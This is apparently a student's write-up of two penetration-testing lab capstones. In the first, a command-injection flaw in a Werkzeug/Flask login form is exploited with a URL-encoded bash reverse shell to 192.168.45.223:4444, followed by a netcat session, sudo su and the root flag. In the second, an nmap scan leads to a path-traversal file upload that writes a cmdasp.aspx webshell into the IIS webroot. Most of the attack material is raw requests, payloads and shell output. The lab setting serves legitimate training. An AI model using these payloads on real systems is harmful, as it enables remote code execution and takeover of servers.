...
Capstone Exercise: Start the Future Factor Authentication application on VM #3. Identify the vulnerability, exploit it and obtain a reverse shell. Use sudo su in the reverse shell to obtain elevated privileges and find the flag located in the /root/ directory.
**NOTE: Check source, remove params, test req for error output, and read carefully!!!**

[Command Injection Cheat Sheet](https://github.com/payloadbox/command-injection-payload-list);
[Payload All the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python)

```
username=admin&password=123&ffa=aaaa+%2B+bbbb
```

Noted Python server. Removed a param, werkzeug throws a fit. Werkzeug has a [console](https://werkzeug.palletsprojects.com/en/2.3.x/debug/) page for debugging and it appears to be enabled.

[Pin generating](https://ctftime.org/writeup/17955)

[Werkzeug PIN exploit](https://www.daehee.com/werkzeug-console-pin-exploit/)

```
### First capture your reg in Burp, remove a param to error the page
...
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.201.16
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.201.16/login
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

username=test&password=test&=aaaa%2Bbbbb

### Note 'ffa' has been removed ^

### Review resulting Error out, Python server Werkzeug 2.2.2, note the leaked source;

...
</pre>
<pre class="line current"><span class="ws">            
</span>ffa = request.form[&#39;ffa&#39;]</pre>
<pre class="line after"><span class="ws">            
</span>out = os.popen(f&#39;echo &#34;{ffa}&#34;&#39;).read()</pre> # <-- IMPORTANT
<pre class="line after"><span class="ws">            
</span>if out == (random_string+random_string2):</pre>
<pre class="line after"><span class="ws">                
</span>output = &#34;FFA was correct!&#34;</pre>
...

### That bit is an echo through OS Popen, manipulate '"' open/close to execute; 

>>> ffa = '"; bash -c "bash -i >& /dev/tcp/192.168.45.223/4444 0>&1" "'
>>> out = os.popen(f'echo "{ffa}"').read()

### urlencode

$ urlencode '"; bash -c "bash -i >& /dev/tcp/192.168.45.223/4444 0>&1" "'
%22%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22%20%22
...
username=test&password=test&ffa=%22%3B%20bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.223%2F4444%200%3E%261%22%20%22

### Back to the netcat listener...

$ netcat -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.201.16] 51218
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

yelnats@97ca26601f06:/app$ sudo -l
sudo -l
Matching Defaults entries for yelnats on 97ca26601f06:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User yelnats may run the following commands on 97ca26601f06:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
yelnats@97ca26601f06:/app$ sudo su
sudo su
ls /root/
flag.txt
cat /root/flag.txt
OS{01b3ec7e0102b86e2662927052bc27a9}

### Success!!!!
```

Capstone Exercise: Enumerate the machine VM #4. Find the web application and get access to the system. The flag can be found in C:\\inetpub.

```
### Enumerate web server

$ sudo nmap -v -sS -O -sV 192.168.201.192
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-29 08:50 PDT
NSE: Loaded 46 scripts for scanning.
Initiating Ping Scan at 08:50
Scanning 192.168.201.192 [4 ports]
Completed Ping Scan at 08:50, 0.11s elapsed (1 total hosts)
...
Scanning 192.168.201.192 [1000 ports]
Discovered open port 445/tcp on 192.168.201.192
Discovered open port 139/tcp on 192.168.201.192
Discovered open port 135/tcp on 192.168.201.192
Discovered open port 80/tcp on 192.168.201.192
Discovered open port 8000/tcp on 192.168.201.192
Completed SYN Stealth Scan at 08:50, 1.34s elapsed (1000 total ports)
Initiating Service scan at 08:50
Scanning 5 services on 192.168.201.192
Completed Service scan at 08:50, 11.27s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against 192.168.201.192
Retrying OS detection (try #2) against 192.168.201.192
Retrying OS detection (try #3) against 192.168.201.192
Retrying OS detection (try #4) against 192.168.201.192
Retrying OS detection (try #5) against 192.168.201.192
NSE: Script scanning 192.168.201.192.
Initiating NSE at 08:51
Completed NSE at 08:51, 0.45s elapsed
Initiating NSE at 08:51
Completed NSE at 08:51, 0.35s elapsed
Nmap scan report for 192.168.201.192
...
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=8/29%OT=80%CT=1%CU=35477%PV=Y%DS=4%DC=I%G=Y%TM=64EE13E
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10E%TI=I%TS=A)OPS(O1=M551NW
OS:8ST11%O2=M551NW8ST11%O3=M551NW8NNT11%O4=M551NW8ST11%O5=M551NW8ST11%O6=M5
OS:51ST11)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)ECN(R=Y%DF=Y%
...
OS:N)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=70E5%RU
OS:D=G)IE(R=N)

Uptime guess: 0.021 days (since Tue Aug 29 08:21:18 2023)
...
Nmap done: 1 IP address (1 host up) scanned in 26.40 seconds
           Raw packets sent: 1174 (57.962KB) | Rcvd: 1051 (44.958KB)

### Possible webroot location;

C:\inetpub\wwwroot

### Welp, that is webroot and it looks like we can write to arbitrary paths!!!

POST / HTTP/1.1
Host: 192.168.201.192:8000
Content-Length: 1281
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.201.192:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxmF3qS6IUW8U3vNa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.201.192:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __AntiXsrfToken=23aa2d7d0a8d441f8e7660cc0dc5b78c
Connection: close

------WebKitFormBoundaryxmF3qS6IUW8U3vNa
...

------WebKitFormBoundaryxmF3qS6IUW8U3vNa
...
bac8tK3BIakQSbxCu/v2b0LHxQ5TCUiaWfB6Ak+GW9motXWRODqSWaG6K4A1+fSuQqvbOJ1oTdtnMIPVgswGYgGdWEno71XAfGMMNh6KzPUJyU96OEcsnq4mLoMOgH7g
------WebKitFormBoundaryxmF3qS6IUW8U3vNa
Content-Disposition: form-data; name="ctl00$MainContent$FileUploadControl"; filename="../../../../../../../inetpub/wwwroot/test.txt"
Content-Type: text/plain

test

------WebKitFormBoundaryxmF3qS6IUW8U3vNa
Content-Disposition: form-data; name="ctl00$MainContent$UploadButton"

Upload
------WebKitFormBoundaryxmF3qS6IUW8U3vNa--

### Confirmed webroot via curl;

$ curl http://192.168.201.192/test.txt
test

###
### it appears the correct tool for this job is cmdasp.aspx
### webshell.  You can only exec an aspx from webroot.
### A few other shell asp failed, likely due to server config.
###

POST / HTTP/1.1
Host: 192.168.200.192:8000
Content-Length: 2766
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.200.192:8000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFhfQTZYAL8cdf5pf
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.200.192:8000/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: __AntiXsrfToken=2b8b41d59ff544e89dff86aaf1126550
Connection: close

------WebKitFormBoundaryFhfQTZYAL8cdf5pf
Content-Disposition: form-data; name="__EVENTTARGET"
...

------WebKitFormBoundaryFhfQTZYAL8cdf5pf
Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"
...
Q3AVa4zjkt5xjyvzcQ3AB/4x8d274KYwRUVy2ihj+THMXJ5Q4hnoeYYtNTmWa3Adxk7DpqCr0CammTXYyQQVfHTZoMfSgE9TRUD8ywSBj7rlSrxcmjfki3RwEwX2VY7i
------WebKitFormBoundaryFhfQTZYAL8cdf5pf
Content-Disposition: form-data; name="ctl00$MainContent$FileUploadControl"; filename="..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2Fcmdasp.aspx"
Content-Type: application/octet-stream
...
OS{0ef4f475ecc264ea3fc866354dde81be}
